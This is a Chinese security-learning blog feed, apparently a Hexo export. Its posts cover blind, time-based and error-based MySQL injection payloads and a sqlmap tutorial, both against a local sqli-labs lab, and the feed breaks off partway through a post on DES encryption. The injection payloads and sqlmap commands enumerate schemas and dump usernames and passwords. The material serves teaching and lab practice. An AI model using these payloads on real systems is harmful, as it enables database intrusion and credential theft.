table_schema=database()),1,1))&gt;99--+</span><br><span class="line"><span class="comment">#逐一判断表名</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27;))&gt;20--+</span></span><br><span class="line"><span class="string">#判断所有字段名的长度</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),<span class="number">1</span>,<span class="number">1</span>))&gt;99--+</span><br><span class="line"><span class="comment">#逐一判断字段名。</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and length((select group_concat(username,password) from users))&gt;109--+</span></span><br><span class="line"><span class="string">#判断字段内容长度</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and ascii(substr((select group_concat(username,password) from users),<span class="number">1</span>,<span class="number">1</span>))&gt;50--+</span><br><span class="line"><span class="comment">#逐一检测内容。</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h1><ul><li>有时候，输入任何东西显示的内容都是一样的，这样布尔注入就不能使用了</li><li>这个时候我们可以使用时间注入，时间注入和布尔盲注两种没有多大差别只不过时间盲注多了if函数和sleep()函数。</li><li>if(a,sleep(10),1)如果a结果是真的，那么执行sleep(10)页面延迟10秒，如果a的结果是假，执行1，页面不延迟。</li></ul><h2 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h2><ul><li>以sqli-labs-less-9为例</li><li>因为只是用法不同，查询过程时一样的，所有可以参考以下内容<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and if(1=1,sleep(5),1)--+</span></span><br><span class="line"><span class="string">#判断参数构造。</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>and <span class="keyword">if</span>(length((select database()))&gt;9,<span class="built_in">sleep</span>(5),1)--+</span><br><span class="line"><span class="comment">#判断数据库名长度</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</span></span><br><span class="line"><span class="string">#逐一判断数据库字符</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>and <span class="keyword">if</span>(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,<span class="built_in">sleep</span>(5),1)--+</span><br><span class="line"><span class="comment">#判断所有表名长度</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span></span><br><span class="line"><span class="string">#逐一判断表名</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>and <span class="keyword">if</span>(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,<span class="built_in">sleep</span>(5),1)--+</span><br><span class="line"><span class="comment">#判断所有字段名的长度</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27;),1,1))&gt;99,sleep(5),1)--+</span></span><br><span class="line"><span class="string">#逐一判断字段名。</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and <span class="keyword">if</span>(length((select group_concat(username,password) from users))&gt;109,<span class="built_in">sleep</span>(5),1)--+</span><br><span class="line"><span class="comment">#判断字段内容长度</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span></span><br><span class="line"><span class="string">#逐一检测内容。</span></span><br></pre></td></tr></table></figure></li><li>如果结果为真，页面会延迟5秒显示，为假，则不会延迟，将直接显示</li></ul><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="报错注入的定义"><a href="#报错注入的定义" class="headerlink" title="报错注入的定义"></a>报错注入的定义</h2><ul><li>当网站的页面上没有显示位用于展示SQL语句执行后的结果，但是sql语句执行可以输出错误信息，那么攻击者可以利用注入过程中返回的错误信息进行判断。</li><li>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</li><li>以sqli-labs-less-17为例</li></ul><h2 id="常用的函数"><a href="#常用的函数" class="headerlink" title="常用的函数"></a>常用的函数</h2><ol><li>extractvalue()</li><li>updataxml()</li><li>count()+rand()+floor()+group by()导致的主键重复</li></ol><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><ul><li><code>extractvalue(XML_document,XPath_string)</code></li><li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</li><li>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</li><li>作用：从XML_document中提取符合XPATH_string的值，当我们XPath_string语法报错时候就会报错，下面的语法就是错误的。concat和我前面说的的group_concat作用一样<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921232830.png" alt="image.png"></li><li>因为只是用法不同，查询过程时一样的，所有可以参考以下内容</li><li>在最后一步爆字段内容时候，<strong>会报错</strong>，原因是mysql数据不支持查询和更新是同一张表。所以我们<strong>需要加一个中间表</strong>。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; and (extractvalue(1,concat(0x5c,version(),0x5c)))#    </span></span><br><span class="line"><span class="string">爆版本</span></span><br><span class="line"><span class="string">1&#x27;</span> and (extractvalue(1,concat(0x5c,database(),0x5c)))<span class="comment">#   </span></span><br><span class="line">爆数据库</span><br><span class="line">1<span class="string">&#x27; and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c)))#   </span></span><br><span class="line"><span class="string">爆表名</span></span><br><span class="line"><span class="string">1&#x27;</span> and (extractvalue(1,concat(0x5c,(<span class="keyword">select</span> group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_schema=database() and table_name=<span class="string">&#x27;users&#x27;</span>),0x5c)))<span class="comment"># </span></span><br><span class="line">爆字段名</span><br><span class="line">1<span class="string">&#x27; and (extractvalue(1,concat(0x5c,(select password from (select password from users where username=&#x27;</span>admin1<span class="string">&#x27;) b) ,0x5c)))#</span></span><br><span class="line"><span class="string">爆字段内容该格式针对mysql数据库。</span></span><br><span class="line"><span class="string">1&#x27;</span> and (extractvalue(1,concat(0x5c,(<span class="keyword">select</span> group_concat(username,<span class="string">&#x27;:&#x27;</span>,password) from (<span class="keyword">select</span> username,password from <span class="built_in">users</span>)a ),0x5c)))<span class="comment">#</span></span><br><span class="line">爆字段内容。</span><br></pre></td></tr></table></figure></li></ul><h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><ul><li><code>updatexml (XML_document, XPath_string, new_value)</code></li><li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</li><li>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</li><li>第三个参数：new_value，String格式，替换查找到的符合条件的数据</li><li>作用：改变文档中符合条件的节点的值，改变XML_document中符合XPATH_string的值</li><li>当我们XPath_string语法报错时候就会报错，updatexml()报错注入和extractvalue()报错注入基本差不多。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">123<span class="string">&#x27; and (updatexml(1,concat(0x5c,version(),0x5c),1))# 爆版本</span></span><br><span class="line"><span class="string">123&#x27;</span> and (updatexml(1,concat(0x5c,database(),0x5c),1))<span class="comment"># 爆数据库</span></span><br><span class="line">123<span class="string">&#x27; and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#</span></span><br><span class="line"><span class="string">爆表名</span></span><br><span class="line"><span class="string">123&#x27;</span> and (updatexml(1,concat(0x5c,(<span class="keyword">select</span> group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> and table_name =<span class="string">&#x27;users&#x27;</span>),0x5c),1))<span class="comment">#</span></span><br><span class="line">爆字段名</span><br><span class="line">123<span class="string">&#x27; and (updatexml(1,concat(0x5c,(select password from (select password from users where username=&#x27;</span>admin1<span class="string">&#x27;) b),0x5c),1))#</span></span><br><span class="line"><span class="string">爆密码该格式针对mysql数据库。爆其他表就可以，下面是爆emails表</span></span><br><span class="line"><span class="string">123&#x27;</span> and (updatexml(1,concat(0x5c,(<span class="keyword">select</span> group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> and table_name =<span class="string">&#x27;emails&#x27;</span>),0x5c),1))<span class="comment">#</span></span><br><span class="line">1<span class="string">&#x27; and (updatexml (1,concat(0x5c,(select group_concat(id,email_id) from emails),0x5c),1))#   </span></span><br><span class="line"><span class="string">爆字段内容。</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h2><ul><li>group by 报错注入比较复杂，可以先看看<a href="https://blog.csdn.net/m0_53065491/article/details/121893986" title="深入理解group by报错注入_m0_53065491的博客-CSDN博客">group by理解</a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">123<span class="string">&#x27; and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))#     爆数据库</span></span><br><span class="line"><span class="string">123&#x27;</span> and (<span class="keyword">select</span> count(*) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))<span class="comment">#      爆数据库版本</span></span><br><span class="line"> </span><br><span class="line">1<span class="string">&#x27; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#    通过修改limit后面数字一个一个爆表</span></span><br><span class="line"><span class="string">1&#x27;</span> and (<span class="keyword">select</span> count(*) from information_schema.tables <span class="built_in">where</span> table_schema=database() group by concat(0x7e,(<span class="keyword">select</span> group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database()),0x7e,floor(rand(0)*2)))<span class="comment">#        爆出所有表</span></span><br><span class="line"></span><br><span class="line">1<span class="string">&#x27; and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27;),0x7e,floor(rand(0)*2)))#    爆出所有字段名</span></span><br><span class="line"><span class="string">1&#x27;</span> and (<span class="keyword">select</span> count(*) from information_schema.columns group by concat(0x7e,(<span class="keyword">select</span> group_concat(username,password) from <span class="built_in">users</span>),0x7e,floor(rand(0)*2)))<span class="comment">#    爆出所有字段名</span></span><br><span class="line"> </span><br><span class="line">1<span class="string">&#x27; and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username=&#x27;</span>admin1<span class="string">&#x27;),0x7e,floor(rand(0)*2)))a)#    爆出该账户的密码。</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MYSQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试工具-sqlmap</title>
      <link href="/2023/09/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-SQLMap/"/>
      <url>/2023/09/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-SQLMap/</url>
      
        <content type="html"><![CDATA[<h1 id="SQLMap简介"><a href="#SQLMap简介" class="headerlink" title="SQLMap简介"></a>SQLMap简介</h1><ul><li>SQLMAP是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL和SQL注入漏洞，其广泛的功能和选项包括数据库指纹，枚举，数据库提权，访问目标文件系统，并在获取操作权限时执行任意命令。</li><li>支持的数据库有<code>MySQL</code>, <code>Oracle</code>,<code>PostgreSQL</code>, <code>Microsoft SQL Server</code>, <code>Microsoft Access</code>, <code>IBM DB2</code>, <code>SQLite</code>, <code>Firebird</code>,<code>Sybase</code>和<code>SAP MaxDB</code>。</li><li>sqlmap支持五种不同的注入模式：</li></ul><ol><li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入；</li><li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</li><li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</li><li>联合查询注入，可以使用union的情况下的注入；</li><li>堆查询注入，可以同时执行多条语句的执行时的注入；</li></ol><ul><li>以下采用sqli-labs靶场为实例工具</li></ul><h1 id="SQLMap基础操作"><a href="#SQLMap基础操作" class="headerlink" title="SQLMap基础操作"></a>SQLMap基础操作</h1><h2 id="常用命令及参数"><a href="#常用命令及参数" class="headerlink" title="常用命令及参数"></a>常用命令及参数</h2><ul><li>查看sqlmap的命令帮助手册<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-h,--help       #显示基本帮助信息并退出</span><br><span class="line">-u  &quot;url&quot;#检测注入点</span><br><span class="line">--dbs#列出所有数据库的名称</span><br><span class="line">--current-db#列出当前数据库的名称</span><br><span class="line">-D#指定一个数据库</span><br><span class="line">--table#列出所有表名</span><br><span class="line">-T#指定表名</span><br><span class="line">--columns#列出所有字段名</span><br><span class="line">-C#指定字段</span><br><span class="line">--dump#列出字段内容</span><br><span class="line">-r XXX.txt      #post注入，XXX.txt为http数据包</span><br><span class="line">-cookie         #指定cookie</span><br><span class="line">-os -shell      #获取shell</span><br><span class="line">sqlmap -g &quot;inurl:php?id=&quot;   #利用Google自动搜索注入点</span><br></pre></td></tr></table></figure></li></ul><h2 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h2><ul><li>以sqli-labs-less-1为例</li><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921212017.png" alt="image.png"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[21:04:29] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web application technology: PHP 5.4.45, Apache 2.4.39</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.6</span><br></pre></td></tr></table></figure></li><li>出现以上信息，显示存在注入</li><li>当SQLMap执行该命令时，它会执行以下步骤：</li></ul><ol><li>判断可注入的参数；</li><li>判断可以用哪种SQL注入技术来注入；</li><li>识别出哪种数据库；</li><li>根据用户选择，读取哪些数据。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: <span class="built_in">id</span> (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: <span class="built_in">id</span>=2<span class="string">&#x27; AND 4622=4622 AND &#x27;</span>Ihts<span class="string">&#x27;=&#x27;</span>Ihts</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: <span class="built_in">id</span>=2<span class="string">&#x27; AND GTID_SUBSET(CONCAT(0x7171766271,(SELECT (ELT(8159=8159,1))),0x7170766271),8159) AND &#x27;</span>UFpr<span class="string">&#x27;=&#x27;</span>UFpr</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: <span class="built_in">id</span>=2<span class="string">&#x27; AND (SELECT 6178 FROM (SELECT(SLEEP(5)))AVtu) AND &#x27;</span>YciD<span class="string">&#x27;=&#x27;</span>YciD</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: <span class="built_in">id</span>=-8329<span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x7171766271,0x644b754a625073464c596c784579745179626a55784b52796e49735569565054525245766241426c,0x7170766271),NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br></pre></td></tr></table></figure></li></ol><ul><li>给出的信息当中显示，可以注入的参数是id</li><li>可以使用布尔盲注、报错注入、时间注入、联合注入</li></ul><h2 id="列出所有数据库的名字"><a href="#列出所有数据库的名字" class="headerlink" title="列出所有数据库的名字"></a>列出所有数据库的名字</h2><ul><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; --dbs</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921212634.png" alt="image.png"></li><li>通过这个命令可以直接获取到所有数据库的名字</li><li>当继续注入时，<code>-dbs</code>缩写成<code>-D XXX</code>，意思是在XXX数据库中继续查询其他数据</li></ul><h2 id="获取数据库中的表名"><a href="#获取数据库中的表名" class="headerlink" title="获取数据库中的表名"></a>获取数据库中的表名</h2><ul><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; -D security --tables</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921212938.png" alt="image.png"></li><li>通过这个命令，可以获取到指定数据库的所有表名</li><li>当继续注入时，<code>-tables</code>缩写成<code>-T</code>，意思是在指定表继续查询</li></ul><h2 id="获取表中的字段名"><a href="#获取表中的字段名" class="headerlink" title="获取表中的字段名"></a>获取表中的字段名</h2><ul><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; -D security -T users --columns</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921213155.png" alt="image.png"></li><li>通过这个命令，可以获取到指定表的所有字段名</li><li>在后续的注入中， -columns缩写成-C，意思是在指定字段名查询</li></ul><h2 id="获取字段内容"><a href="#获取字段内容" class="headerlink" title="获取字段内容"></a>获取字段内容</h2><ul><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; -D security -T users -C username,password --dump</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921213525.png" alt="image.png"></li><li>通过这个命令，可以获取到指定字段内容</li></ul><h2 id="获取数据库的所有用户"><a href="#获取数据库的所有用户" class="headerlink" title="获取数据库的所有用户"></a>获取数据库的所有用户</h2><ul><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; --users</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921213822.png" alt="image.png"></li><li>该命令的作用是列出数据库的所有用户</li><li>在当前用户有权限读取包含所有用户的表的权限时，使用该命令就可以列出所有管理用户。</li></ul><h2 id="获取数据库用户的密码"><a href="#获取数据库用户的密码" class="headerlink" title="获取数据库用户的密码"></a>获取数据库用户的密码</h2><ul><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; --password</code></li><li>该命令的作用是列出数据库用户的密码，如下所示,如果当前用户有读取包含用户密码的权限， SQLMap会先列举出用户，然后列出Hash ，并尝试破解。</li></ul><h2 id="判断文本中的请求是否存在注入"><a href="#判断文本中的请求是否存在注入" class="headerlink" title="判断文本中的请求是否存在注入"></a>判断文本中的请求是否存在注入</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921214700.png" alt="image.png"></p><ul><li>用burpsuite抓包工具抓取到加载HTTP请求，将内容放入文本文档当中<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921214919.png" alt="image.png"></li><li><code>sqlmap -r less-1.txt  </code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921215213.png" alt="image.png"></li><li><code>-r</code>通常用于存在cookie注入时使用</li></ul><h1 id="SQLMap进阶操作"><a href="#SQLMap进阶操作" class="headerlink" title="SQLMap进阶操作"></a>SQLMap进阶操作</h1><h2 id="探测等级"><a href="#探测等级" class="headerlink" title="探测等级"></a>探测等级</h2><ul><li><code>--level 5</code>指需要执行的测试等级，一共有5个等级</li><li>默认是1，这个参数会影响测试的注入点，GET和POST的数据都会进行测试，HTTP cookie在level为2时就会测试，HTTP User-Agent&#x2F;Referer头在level为3时就会测试。</li><li>总之，在不确定哪个Payload或者参数为注入点时，为了确保全面性，建议使用高的level值。</li></ul><h2 id="当前用户是否为管理权限"><a href="#当前用户是否为管理权限" class="headerlink" title="当前用户是否为管理权限"></a>当前用户是否为管理权限</h2><ul><li>该命令用于查看当前账户是否为数据库管理员账户</li><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; --is-dba</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921220356.png" alt="image.png"></li></ul><h2 id="列出数据库管理员角色"><a href="#列出数据库管理员角色" class="headerlink" title="列出数据库管理员角色"></a>列出数据库管理员角色</h2><ul><li>该命令用于查看数据库用户的角色。如果当前用户有权限读取包含所有用户的 表，输入该命令会列举出每个用户的角色，也可以用-U参数指定想看哪个用户的角色。</li><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; --roles</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921220941.png" alt="image.png"></li></ul><h2 id="HTTP-Referer头"><a href="#HTTP-Referer头" class="headerlink" title="HTTP Referer头"></a>HTTP Referer头</h2><ul><li><strong><code>Referer</code></strong> 请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 <code>Referer</code> 请求头识别访问来源，可能会以此进行统计分析、日志记录以及缓存优化等。</li><li>SQLMap可以在请求中伪造HTTP中的refer”当level参数设定为3或3 以上时，会尝试对refere注入。可以使用refere命令来欺骗，如 <code>--referer http:// www.baidu.com</code></li></ul><h2 id="运行自定义SQL语句"><a href="#运行自定义SQL语句" class="headerlink" title="运行自定义SQL语句"></a>运行自定义SQL语句</h2><ul><li>该命令用于执行指定的SQL语句</li><li>以<code>select * from users limit 0,1</code>为例<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921221923.png" alt="image.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DES加密原理</title>
      <link href="/2023/09/13/DES%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86/"/>
      <url>/2023/09/13/DES%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="DES算法"><a href="#DES算法" class="headerlink" title="DES算法"></a>DES算法</h1><h2 id="DES算法简介"><a href="#DES算法简介" class="headerlink" title="DES算法简介"></a>DES算法简介</h2><ul><li>DES是一种明文分组为64比特，有效密钥56比特，输出密文64比特的，具有16轮迭代的Feistel密码算法。</li><li>DES由初始置换，16轮迭代，初始逆置换组成。</li></ul><h2 id="算法加密流程描述"><a href="#算法加密流程描述" class="headerlink" title="算法加密流程描述"></a>算法加密流程描述</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913215648.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913222123.png" alt="image.png"></p><ol><li>输入64位明文，进行初始置换IP</li><li>将明文分成左右两部分，为L0，R0，各32位</li><li>在密钥的控制下，进行16次运算</li><li>运算结束将左右交换，连接在一起再进行逆置换</li><li>最后输出64位密文</li></ol><h1 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h1><h2 id="初始置换"><a href="#初始置换" class="headerlink" title="初始置换"></a>初始置换</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913220034.png" alt="image.png"></p><ul><li>将输入的明文按照上表进行置换</li><li>例如，输出块的第1位对应输入块的第58位，第2位对应第50位，依次类推</li><li>则输入块是D1~D64，输出块是D58，D50，D42，……，D15，D7；</li><li>然后将输出块左右分成L0和R0</li></ul><h2 id="加密16轮迭代"><a href="#加密16轮迭代" class="headerlink" title="加密16轮迭代"></a>加密16轮迭代</h2><h3 id="密钥置换"><a href="#密钥置换" class="headerlink" title="密钥置换"></a>密钥置换</h3><ul><li>密钥共有64位，16轮迭代后为48为子密钥</li></ul><ol><li>将密钥的奇偶位忽略不计（就是每个字节的第八位），64位变为56位，根本选择置换PC-1将56位的密钥分成左C0（28位），右D0（28位），表中第8、16、24、…、64位被忽略<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913220958.png" alt="image.png"></li><li>根据轮数，将Cn，Dn进行左移<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913221141.png" alt="image.png"></li></ol><ul><li>比如C0和D0进行第一次左移，根据表格，是左移一位，得到以下<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C1</span><br><span class="line">49,41,33,25,17,9,1,  </span><br><span class="line">58,50,42,34,26,18,10,  </span><br><span class="line">2,59,51,43,35,27,19,  </span><br><span class="line">11,3,60,52,44,36,57</span><br><span class="line">D1</span><br><span class="line">55,47,39,31,23,15,7,  </span><br><span class="line">62,54,46,38,30,22,14,  </span><br><span class="line">6,61,53,45,37,29,21,  </span><br><span class="line">13,5,28,20,12,4,63</span><br></pre></td></tr></table></figure></li></ul><ol start="3"><li>然后C1和D1合并，经过置换选择表2（PC-2），生成48位的子密钥，表格如下<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913221434.png" alt="image.png"></li><li>此后每次都进行拆分，然后左移，再合并，然后经过PC-2生成子密钥K</li><li>依次类推，得到K1~K16</li></ol><h3 id="扩展置换E"><a href="#扩展置换E" class="headerlink" title="扩展置换E"></a>扩展置换E</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913221636.png" alt="image.png"></p><ul><li>根据以上表格，将32位扩展为48位</li><li>中间为原本的32位，两边位扩展的位，总共48位</li></ul><h3 id="S-盒代替"><a href="#S-盒代替" class="headerlink" title="S-盒代替"></a>S-盒代替</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913221941.png" alt="image.png"></p><ol><li>Rn经过扩展，为48位，与48位的Kn进行异或运算，得到48位输出块，为8个6bit的串，分别为B1~B8</li><li>根据上表，对应S1~S8，进行代替操作，这一步是将6bit的串，前后各一位对应纵列，中间四位对应行，例如110010以S1为例，在行当中找到1001对应的十六进制9，在列当中找到10对应的十六进制2，对应十六进制12，则输出为1100</li></ol><h3 id="P-盒置换"><a href="#P-盒置换" class="headerlink" title="P-盒置换"></a>P-盒置换</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913222957.png" alt="image.png"></p><ol><li>S-盒代替之后，每盒有4位，共八盒，就是32位，作为P-盒的输入块</li><li>根据上表，对Rn进行置换，得到的串与左部分Ln进行异或运算，得到的串赋值给R(n+1)</li><li>R(n)直接赋值给L(n+1)</li><li>然后再进行下一次迭代</li></ol><h2 